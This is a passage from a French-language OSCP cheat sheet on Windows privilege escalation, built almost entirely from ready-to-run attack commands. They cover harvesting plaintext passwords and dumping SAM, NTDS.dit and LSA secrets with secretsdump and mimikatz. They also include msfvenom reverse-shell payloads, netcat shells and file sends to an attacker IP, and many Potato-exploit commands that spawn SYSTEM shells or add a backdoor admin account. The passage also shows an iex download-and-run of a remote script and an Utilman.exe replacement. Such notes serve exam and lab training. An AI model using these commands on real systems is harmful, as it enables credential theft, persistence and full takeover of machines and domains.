tcp    192.168.1.9:139    192.168.1.9:32874  TIME_WAIT    -
tcp    127.0.0.1:445      127.0.0.1:1159     ESTABLISHED  -
udp    0.0.0.0:135        0.0.0.0:*                       -
udp    192.168.1.9:500    0.0.0.0:*                       -

```

## Recherche de mots de passe en clair

Vérifier les comptes, les secrets et les mécanismes d'authentification.

### Utilisation de Findstr

```bash
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

```

### Recherche dans les fichiers de configuration

<p class="oscp-command-note">Lister les fichiers de configuration ou d'identifiants accessibles.</p>

```bash
dir /s *pass* == *cred* == *vnc* == *.config*

```

### Recherche dans tous les fichiers

```bash
findstr /spin "password" *.*
findstr /spin "password" *.*

```

### Vérifier les fichiers spécifiques

<p class="oscp-command-note">Chemins Windows de fichiers de configuration à rechercher, non exécutables.</p>

```text
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

```

### Rechercher des fichiers de mots de passe VNC

<p class="oscp-command-note">Afficher le contenu des répertoires concernés par «Rechercher des fichiers de mots de passe VNC».</p>

```bash
dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini

```

### Registre Winlogon et ouverture de session automatique

Afficher les paramètres Winlogon pour vérifier une configuration AutoAdminLogon. La lecture peut exposer des secrets : ne pas les inclure tels quels dans un rapport.

<p class="oscp-command-note">Registre Winlogon et ouverture de session automatique.</p>

```powershell
reg query 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
```

### Chemin de l'historique PSReadLine

Afficher l'emplacement où PowerShell enregistre son historique pour le compte courant ; le chemin ne garantit pas qu'un historique soit présent.

<p class="oscp-command-note">Chemin de l'historique PSReadLine.</p>

```powershell
(Get-PSReadLineOption).HistorySavePath
```

## Copies instantanées VSS (SAM, SYSTEM, NTDS.dit, SECURITY, NTUSER.dat)

**Paramètres et repères :**
`Windows.Old` · `SYSTEM` · `SAM` · `NTDS.dit`  
`SECURITY` · `NTUSER.dat`  

<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Windows\System32\SAM</code></p>

<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>C:\windows.old\Windows\System32\SAM</code></p>
**Paramètres et repères :**
`impacket-tool`  

### Sauvegarder les ruches SAM et SYSTEM

<p class="oscp-command-note">Consulter ou modifier une clé de Registre.</p>

```powershell
reg save hklm\sam <destination_path>\sam

```

```powershell
reg save hklm\system <destination_path>\system

```

```bash
samdump2 <system_file> <sam_file>
# Autre possibilité
impacket-secretsdump -sam <sam_file> -system <system_file> LOCAL

```

<p class="oscp-command-note">Analyser les informations d’authentification avec Mimikatz.</p>

```powershell
mimikatz # lsadump::sam /sam:"<sam_file>" /system:"<system_file>"

```

### Accéder à NTDS.dit (base Active Directory)

Examiner les objets, les droits et les services du domaine.

```powershell
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ShadowCopyID>\windows\ntds\ntds.dit <destination_path>\ntds.dit.bak

```

```powershell
reg.exe save hklm\system <destination_path>\system.bak

```

<p class="oscp-command-note">Examiner les données d&#x27;authentification avec SecretsDump.</p>

```bash
impacket-secretsdump -ntds <ntds_dit_backup> -system <system_backup> LOCAL

```

<p class="oscp-command-note">Analyser les informations d’authentification avec Mimikatz.</p>

```powershell
mimikatz # lsadump::ntds /ntds:"<ntds_dit_backup>" /system:"<system_backup>"

```

### Extraire les secrets LSA depuis la ruche SECURITY

Vérifier les comptes, les secrets et les mécanismes d'authentification.

<p class="oscp-command-note">Consulter ou modifier une clé de Registre.</p>

```powershell
reg save hklm\security <destination_path>\security

```

```powershell
reg save hklm\system <destination_path>\system

```

<p class="oscp-command-note">Examiner les données d&#x27;authentification avec SecretsDump.</p>

```bash
impacket-secretsdump -security <security_file> -system <system_file> LOCAL

```

<p class="oscp-command-note">Analyser les informations d’authentification avec Mimikatz.</p>

```powershell
mimikatz # lsadump::secrets /security:"<security_file>" /system:"<system_file>"

```

### Extraire des données d’authentification utilisateur depuis NTUSER.dat

Vérifier les comptes, les secrets et les mécanismes d'authentification.

**Paramètres et repères :**
`NTUSER.dat`  

<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Users\&lt;username&gt;\NTUSER.dat</code></p>

<p class="oscp-command-note">Consulter ou modifier une clé de Registre.</p>

```powershell
reg load hku\TempHive <path_to_ntuser.dat>

```

### Accéder aux copies instantanées de volume (VSS)

```powershell
vssadmin list shadows

```

```powershell
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ShadowCopyID>\<path_to_file> <destination_path>

```

## Vérifier AlwaysInstallElevated dans le Registre

Observer les permissions et la configuration de Windows.

**Paramètres et repères :**
`HKEY_LOCAL_MACHINE` · `HKEY_CURRENT_USER` · `1`  

### Comment vérifier la vulnérabilité

<p class="oscp-command-note">Registre : vérifier les politiques AlwaysInstallElevated.</p>

```powershell
# Vérifier HKEY_LOCAL_MACHINE pour la politique à l'échelle du système
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

# Vérifiez dans HKEY_CURRENT_USER pour la politique spécifique à l'utilisateur
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

```

### Interpréter les résultats

**Paramètres et repères :**
`1`  

### Exploiter la configuration vulnérable

**Paramètres et repères :**
`1`  

<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f msi -o malicious.msi

```

<p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>

```bash
# Utilisation de Netcat
nc -lvnp <your_port>

# Utilisation de Metasploit (interdit dans l'examen)
msfconsole
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST <your_ip>
set LPORT <your_port>
run

```

**Paramètres et repères :**
`msiexec`  

<p class="oscp-command-note">Windows : lancer un package MSI avec msiexec ; ne pas traiter le fichier comme une commande Linux.</p>

**Attention :** l’installation d’un MSI ne garantit aucune élévation de privilèges. Dans le scénario AlwaysInstallElevated, vérifier les deux politiques du Registre avant de conclure.

```powershell
# Sur Windows : installation silencieuse d'un fichier MSI de laboratoire autorisé.
msiexec.exe /i .\malicious.msi /qn
```

### WinPEAS

```powershell
.\winPEAS.ps1

```

```powershell
.\winPEAS.ps1 | tee winpeas_output.txt

```

```powershell
.\winPEAS.ps1 | Out-File -FilePath winpeas_output.txt

```

<p class="oscp-command-note">Convertir les résultats PEAS en fichiers JSON ou HTML.</p>

```powershell
# 1. Télécharger le fichier de la victime à la Kali locale, nous pourrions utiliser les techniques de la section 17.

# 2. Convert .txt to .json.
python3 peas2json.py ./winpeas_output.txt peass.json

# 3. Convert .json to .html.
python3 json2html.py peass.json peass.html

# Facultatif : convertir aussi le rapport au format PDF.
python3 json2pdf.py peass.json peass.pdf

```

```powershell
Get-Content winpeas_output.txt | ConvertTo-Html | Out-File winpeas_output.html

```

### PowerUp

```powershell
.\powerup.ps1

```

```powershell
.\PowerUp.ps1 -CheckMissingPatches

```

```powershell
.\PowerUp.ps1 -UnquotedServicePaths

```

```powershell
.\PowerUp.ps1 -CheckWritableServices

```

```powershell
.\PowerUp.ps1 -ScheduledTasks

```

```powershell
.\PowerUp.ps1 -WeakFilePermissions

```

```powershell
.\PowerUp.ps1 -AutoDownloadBinaries

```

### PowerCat

```powershell
.\powercat.ps1 -c [target_IP] -p [port] -e [command]

```

```powershell
.\powercat.ps1 -c [attacker_IP] -p [port] -e powershell.exe

```

```powershell
.\powercat.ps1 -c [ATTACKER_IP] -p [PORT] -f [FILE_TO_SEND]

```

```powershell
.\powercat.ps1 -c [TARGET_IP] -p [PORT] -s

```

### PowerView

<p class="oscp-command-note">PowerView : charger le script PowerShell en vérifiant la politique d'exécution.</p>

```powershell
# Dans une session PowerShell autorisée, charger PowerView depuis un fichier local.
Import-Module .\PowerView.ps1

# Vérifier que la fonction attendue est présente.
Get-Command Get-Domain -ErrorAction SilentlyContinue
```

```powershell
.\PowerView.ps1 -Command "Get-NetUser"

```

```powershell
.\PowerView.ps1 -Command 'Get-NetGroup -GroupName "Domain Admins"'

```

```powershell
.\PowerView.ps1 -Command 'Get-NetUser -SPN'

```

```powershell
.\PowerView.ps1 -Command 'Get-NetDomainController'

```

```powershell
.\PowerView.ps1 -Command 'Get-NetShare'

```

```powershell
.\PowerView.ps1 -Command 'Get-NetUser -Delegation'

```

### PowerMad

```powershell
.\PowerMad.ps1

```

```powershell
.\PowerMad.ps1 -Command "Get-DomainAdminGroup"

```

```powershell
.\PowerMad.ps1 -Command "Get-DomainAdminGroup" | Out-File -FilePath powermad_output.txt

```

### PrivescCheck

```powershell
.\PrivescCheck.ps1

```

```powershell
.\PrivescCheck.ps1

```

```powershell
.\PrivescCheck.ps1 | Out-File -FilePath privesccheck_output.txt

```

### Seatbelt

```powershell
.\Seatbelt.exe

```

#### Installation

<p class="oscp-command-note">Examiner les fichiers et l&#x27;historique Git.</p>

```bash
git clone https://github.com/S3cur3Th1sSh1t/PowerSharpPack
cd PowerSharpPack

```

```powershell
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpPack.ps1')

```

**Paramètres et repères :**
`-Command`  

```powershell
# Examiner la propriété AMSIProviders avec Seatbelt
PowerSharpPack -seatbelt -Command "AMSIProviders"

```

#### Outils et exemples de code inclus

```powershell
PowerSharpPack -InternalMonologue

```

```powershell
# Examiner la propriété AMSIProviders avec Seatbelt
PowerSharpPack -seatbelt -Command "AMSIProviders"

```

```powershell
# Examiner un module PowerSharpPack
PowerSharpPack -SharpWeb

```

```powershell
# Examiner un module PowerSharpPack
PowerSharpPack -UrbanBishop

```

```powershell
# Examiner un module PowerSharpPack
PowerSharpPack -SharpUp

```

```powershell
# Examiner la propriété kerberoast avec Seatbelt
PowerSharpPack -Rubeus -Command "kerberoast /outfile:Roasted.txt"

```

```powershell
# Examiner la propriété Persist avec Seatbelt
PowerSharpPack -SharPersist -Command "Persist"

```

```powershell
# Examiner la propriété Get-Domain avec Seatbelt
PowerSharpPack -SharpView -Command "Get-Domain"

```

```powershell
# Examiner un module PowerSharpPack
PowerSharpPack -winPEAS

```

```powershell
# Examiner un module PowerSharpPack
PowerSharpPack -SharpChromium

```

#### Scripts autonomes

**Paramètres et repères :**
`PowerSharpBinaries`  

```powershell
# Examiner un module PowerSharpPack
PowerSharpPack -SharpCloud

```

```powershell
# Examiner un module PowerSharpPack
PowerSharpPack -SharpGPOAbuse

```

```powershell
# Examiner un module PowerSharpPack
PowerSharpPack -SauronEye

```

#### Outils complémentaires

```powershell
PowerSharpPack -SharpShares

```

```powershell
# Examiner un module PowerSharpPack
PowerSharpPack -SharpSniper

```

```powershell
# Examiner un module PowerSharpPack
PowerSharpPack -SharpSpray

```

```powershell
# Examiner un module PowerSharpPack
PowerSharpPack -Grouper2

```

```powershell
# Examiner un module PowerSharpPack
PowerSharpPack -Watson

```

#### Conseils d’exécution

```powershell
PowerSharpPack -Rubeus -Command "kerberoast /outfile:roasted.txt /domain:example.com"

```

**Paramètres et repères :**
`PowerSharpBinaries`  

### Vérification des deux branches

La configuration potentiellement risquée dépend des valeurs de l'utilisateur et de la machine.

<p class="oscp-command-note">Vérification des deux branches.</p>

```powershell
reg query 'HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer' /v AlwaysInstallElevated
reg query 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer' /v AlwaysInstallElevated
```

## Outils d’usurpation de jeton (famille Potato)

<p class="oscp-command-note">Identifier le compte et les groupes visibles dans «Outils d’usurpation de jeton (famille Potato)».</p>

```text
whoami /priv

```

**Paramètres et repères :**
`winPEAS`  

<p class="oscp-inline-ref"><strong>Compte système Windows :</strong> <code>NT AUTHORITY\SYSTEM</code></p>

**Paramètres et repères :**
`PrintSpoofer`  

### DCOMPotato

```bash
DCOMPotato.exe -c "C:\Windows\System32\cmd.exe"

```

```bash
DCOMPotato.exe -c "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"

```

```bash
# Crée le compte utilisateur
DCOMPotato.exe -c "C:\Windows\System32\net.exe user emma Password123 /add"

# Adds it as admin
DCOMPotato.exe -c "C:\Windows\System32\net.exe localgroup Administrators emma /add"

```

### EfsPotato

```bash
EfsPotato.exe "C:\Windows\System32\cmd.exe"

```

```bash
EfsPotato.exe -c "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"

```

```bash
# Crée le compte utilisateur
EfsPotato.exe -c "C:\Windows\System32\net.exe user emma Password123 /add"

# Adds it as admin
EfsPotato.exe -c "C:\Windows\System32\net.exe localgroup Administrators emma /add"

```

### GodPotato

```bash
GodPotato.exe -cmd "C:\Windows\System32\cmd.exe"

```

```bash
GodPotato.exe -cmd "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"

```

```bash
# Crée le compte utilisateur
GodPotato.exe -cmd "C:\Windows\System32\net.exe user emma Password123 /add"

# Adds it as admin
GodPotato.exe -cmd "C:\Windows\System32\net.exe localgroup Administrators emma /add"

```

### Hot Potato (CVE-2016-3225)

```bash
HotPotato.exe -ip -cmd "C:\Windows\System32\cmd.exe"

```

```bash
HotPotato.exe -ip -cmd "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"

```

```bash
# Crée le compte utilisateur
HotPotato.exe -ip -cmd "C:\Windows\System32\net.exe user emma Password123 /add"

# Adds it as admin
HotPotato.exe -ip -cmd "C:\Windows\System32\net.exe localgroup Administrators emma /add"

```

### Juicy Potato

```bash
JuicyPotato.exe -l 1337 -c {4991d34b-80a1-4291-83b6-3328366b9097} -t * -p c:\windows\system32\cmd.exe

```

```bash
JuicyPotato.exe -l 1337 -c {F0001111-0000-0000-0000-0000FEEDACDC} -t * -p "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"

```

```bash
# Crée le compte utilisateur
JuicyPotato.exe -l 1337 -c [clsid] -t * -p "C:\Windows\System32\net.exe user emma Password123 /add"

# Adds it as admin
JuicyPotato.exe -l 1337 -c [clsid] -t * -p "C:\Windows\System32\net.exe localgroup Administrators emma /add"

```

### PrintSpoofer

```bash
PrintSpoofer.exe -c whoami

```

```bash
PrintSpoofer.exe -c "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"

```

```bash
# Crée le compte utilisateur
PrintSpoofer.exe -c "C:\Windows\System32\net.exe user emma Password123 /add"

# Adds it as admin
PrintSpoofer.exe -c "C:\Windows\System32\net.exe localgroup Administrators emma /add"

```

### Rogue Potato

```bash
RoguePotato.exe -r [ATTACKER_IP] -e whoami

```

```bash
RoguePotato.exe -r [ATTACKER_IP] -e "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"

```

```bash
# Crée le compte utilisateur
RoguePotato.exe -r [ATTACKER_IP] -e "C:\Windows\System32\net.exe user emma Password123 /add"

# Adds it as admin
RoguePotato.exe -r [ATTACKER_IP] -e "C:\Windows\System32\net.exe localgroup Administrators emma /add"

```

### RottenPotato

**Paramètres et repères :**
`RottenPotato.exe`  

### SharpEfsPotato

<p class="oscp-command-note">SharpEfsPotato : exécuter une commande de test et enregistrer le résultat.</p>

```bash
SharpEfsPotato.exe -p "C:\Windows\System32\cmd.exe"

# Exemple
SharpEfsPotato.exe -p "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe" -a "whoami | Set-Content C:\temp\w.log"

```

```bash
SharpEfsPotato.exe -p "C:\Windows\system32\cmd.exe" -a "/c C:\temp\nc.exe [kali_ip] [port] -e cmd.exe"
# Autre possibilité
SharpEfsPotato.exe -p "C:\Windows\System32\nc.exe" -a "-e cmd.exe [kali_ip] [port]"

```

```bash
# Crée le compte utilisateur
SharpEfsPotato.exe -p "C:\Windows\System32\net.exe" -a "user emma Password123 /add"

# Ajoute l'utilisateur au groupe Administrateurs
SharpEfsPotato.exe -p "C:\Windows\System32\net.exe" -a "localgroup Administrators emma /add"

```

### SigmaPotato

```bash
SigmaPotato.exe cmd.exe /c whoami

```

```bash
SigmaPotato.exe --revshell [ATTACKER_IP] 4444

```

```bash
# Crée le compte utilisateur
SigmaPotato.exe cmd.exe /c "net user emma Password123 /add"

# Adds it as admin
SigmaPotato.exe cmd.exe /c "net localgroup Administrators emma /add"

```

### SweetPotato

```bash
SweetPotato.exe -a whoami

```

```bash
SweetPotato.exe -a "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"

```

```bash
# Crée le compte utilisateur
SweetPotato.exe -a "C:\Windows\System32\net.exe user emma Password123 /add"

# Adds it as admin
SweetPotato.exe -a "C:\Windows\System32\net.exe localgroup Administrators emma /add"

```

### CVE-2023-29360

**Paramètres et repères :**
`CVE-2023-29360.exe`  

<p class="oscp-command-note">Afficher les processus actifs.</p>

```powershell
PS C:\Users\emma\Desktop> whoami
redteam\emma

PS C:\Users\emma\Desktop> .\CVE-2023-29360.exe
[+] Device Description: Microsoft Streaming Service Proxy
Hardware IDs:
        "SW\{96E080C7-143C-11D1-B40F-00A0C9223196}"
[+] Device Instance ID: SW\{96E080C7-143C-11D1-B40F-00A0C9223196}\{3C0D501A-140B-11D1-B40F-00A0C9223196}
[+] First mapped _MDL: 25f9aa00140
[+] Second mapped _MDL: 25f9aa10040
[+] Unprivileged token reference: ffffd1072dde6061
[+] System token reference: ffffd1071de317d5
Microsoft Windows [Version 10.0.22621.1555]
(c) Microsoft Corporation. All rights reserved.

C:\Users\emma\Desktop> whoami
nt authority\system

```

### SeAssignPrimaryToken

**Paramètres et repères :**
`SeImpersonate` · `JuicyPotato` · `RoguePotato`  

```powershell
JuicyPotato.exe -l 1337 -c {4991d34b-80a1-4291-83b6-3328366b9097} -t * -p c:\windows\system32\cmd.exe

```

```powershell
JuicyPotato.exe -l 1337 -c {F0001111-0000-0000-0000-0000FEEDACDC} -t * -p "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"

```

```powershell
# Crée le compte utilisateur
JuicyPotato.exe -l 1337 -c [clsid] -t * -p "C:\Windows\System32\net.exe user emma Password123 /add"

# Adds it as admin
JuicyPotato.exe -l 1337 -c [clsid] -t * -p "C:\Windows\System32\net.exe localgroup Administrators emma /add"

```

```powershell
RoguePotato.exe -r [kali_ip] -e whoami

```

```powershell
RoguePotato.exe -r [kali_ip] -e "C:\Windows\System32\nc.exe -e cmd.exe [kali_ip] [port]"

```

```powershell
# Crée le compte utilisateur
RoguePotato.exe -r [kali_ip] -e "C:\Windows\System32\net.exe user emma Password123 /add"

# Adds it as admin
RoguePotato.exe -r [kali_ip] -e "C:\Windows\System32\net.exe localgroup Administrators emma /add"

```

### SeBackup

**Paramètres et repères :**
`SeBackupPrivilege`  

<p class="oscp-command-note">Consulter ou modifier une clé de Registre.</p>

```powershell
reg save hklm\sam c:\Temp\sam  
reg save hklm\system c:\Temp\system

```

<p class="oscp-command-note">Examiner les données d&#x27;authentification avec SecretsDump.</p>

```bash
impacket-secretsdump -system system -sam sam local

```

### SeDebug

**Paramètres et repères :**
`SeDebugPrivesc.exe`  

<p class="oscp-command-note">Afficher les processus actifs.</p>

```powershell
ps

```

```powershell
.\SeDebugPrivesc.exe <PID> <Program and Arguments>

```

### SeImpersonate

**Paramètres et repères :**
`Disabled`  

### SeManageVolumeAbuse

```text
C:\

```

**Paramètres et repères :**
`.dll`  

<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Windows\System32\</code></p>

**Paramètres et repères :**
`SeManageVolumeExploit.exe`  

<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Windows\System32\wbem\tzres.dll</code></p>

<p class="oscp-command-note">Afficher la version et la configuration de Windows.</p>

```powershell
systeminfo

```

```powershell
whoami /priv

```

![Checking for SeManageVolume privilege.](https://www.emmanuelsolis.com/img/semanage_1.png)

**Paramètres et repères :**
`SeManageVolume`  

```powershell
.\SeManageVolumeExploit.exe

```

![Executing the exploit.](https://www.emmanuelsolis.com/img/semanage_2.png)

<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>

```bash
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=[attacker_ip] LPORT=[port] -f dll -o tzres.dll

```

<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Windows\System32\wbem\tzres.dll</code></p>

<p class="oscp-command-note">HTTP : télécharger la ressource dans un fichier local.</p>

```powershell
iwr -uri http://[kali_ip]/tzres.dll -OutFile "C:\Windows\System32\wbem\tzres.dll"

```

![Replacing C:\Windows\System32\wbem\tzres.dll.](https://www.emmanuelsolis.com/img/semanage_3.png)

<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Windows\System32\wbem\tzres.dll</code></p>

<p class="oscp-command-note">Afficher la version et la configuration de Windows.</p>

```powershell
systeminfo

```

```powershell
systeminfo

```

![Triggering the payload for a reverse shell.](https://www.emmanuelsolis.com/img/semanage_4.png)

### SeRestore

**Paramètres et repères :**
`utilman.exe` · `SeRestoreAbuse.exe`  

<p class="oscp-command-note">Se placer dans le répertoire utilisé pour «SeRestore».</p>

```powershell
cd C:\Windows\system32

ren Utilman.exe Utilman.old

```

```powershell
ren cmd.exe Utilman.exe

```

<p class="oscp-command-note">Actions distinctes : verrouiller Windows avec Win+L, puis utiliser un client RDP depuis Kali.</p>

**Sur Windows :** `Win + L` est un **raccourci clavier** qui verrouille la session, pas une commande PowerShell.

**Sur Kali :** ouvrir ensuite une connexion RDP autorisée.

```bash
rdesktop <IP_WINDOWS>
```

<p class="oscp-inline-ref"><strong>Compte système Windows :</strong> <code>nt authority\system</code></p>

**Sur l’écran de connexion Windows :** `Win + U` est un **raccourci clavier** qui ouvre les options d’accessibilité. Ce texte ne doit pas être saisi dans un terminal.

**Paramètres et repères :**
`SerestoreAbuse.exe`  

<p class="oscp-command-note">HTTP : télécharger la ressource dans un fichier local.</p>

```powershell
iwr -uri http://[kali_ip]/SeRestoreAbuse.exe -O SeRestoreAbuse.exe

```

<p class="oscp-command-note">Préparer la charge utile sur Kali et appeler SeRestoreAbuse depuis le poste Windows autorisé.</p>

**Sur Kali :** générer le fichier de test dans le laboratoire, si nécessaire.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_KALI> LPORT=<PORT_ECOUTE> -f exe -o payload.exe
```

**Sur Windows :** après transfert du fichier (voir [Transferts](./transferts.md)), exécuter l’outil uniquement dans le périmètre autorisé.

```powershell
.\SeRestoreAbuse.exe "C:\temp\payload.exe"
```

**Autre possibilité Windows, si Netcat est déjà disponible :**

```powershell
.\SeRestoreAbuse.exe "C:\temp\nc.exe <IP_KALI> <PORT_ECOUTE> -e powershell.exe"
```

## Traces d'exécution et configurations à contrôler

Ces commandes sont des vérifications en lecture seule pour comprendre les privilèges, l'historique et les mécanismes de démarrage d'un poste Windows audité.

### Historique PowerShell (PSReadLine)

Lire l'historique enregistré pour l'utilisateur courant. Le fichier peut être absent ou contenir des données sensibles : limiter l'accès aux besoins de l'audit.

<p class="oscp-command-note">Historique PowerShell (PSReadLine).</p>

```powershell
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
```

### Identifiants enregistrés avec Windows

Lister les entrées du Gestionnaire d'identification sans afficher les mots de passe.

<p class="oscp-command-note">Identifiants enregistrés avec Windows.</p>

```powershell
cmdkey /list
```

### Programmes lancés au démarrage

Examiner les entrées Run du registre pour l'utilisateur et la machine.

<p class="oscp-command-note">Programmes lancés au démarrage.</p>

```powershell
reg query 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
reg query 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
```

### Tâches planifiées

Afficher le nom, l'emplacement et l'état des tâches. Vérifier ensuite les droits sur les exécutables concernés.

<p class="oscp-command-note">Tâches planifiées.</p>

```powershell
Get-ScheduledTask | Select-Object TaskName,TaskPath,State
```

### Mises à jour connues du système

Lister les correctifs disponibles dans l'inventaire Windows ; leur absence dans cette sortie ne prouve pas l'absence d'un correctif.

<p class="oscp-command-note">Mises à jour connues du système.</p>

```powershell
Get-HotFix | Sort-Object InstalledOn -Descending
```

### Processus et chemins exécutables

Afficher les chemins des processus visibles pour le compte courant afin de préparer l'analyse des permissions.

<p class="oscp-command-note">Processus et chemins exécutables.</p>

```powershell
Get-Process | Select-Object Name,Id,Path
```

**Référence technique complémentaire :** [Notes OSCP de krovs](https://github.com/krovs/oscp-notes/blob/main/docs/15_windows_privesc.md). Cette synthèse conserve la structure de SKILL-ISSUE et reformule les explications.

<!-- notes-krovs-2026 -->

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

<!-- refined-oscp -->
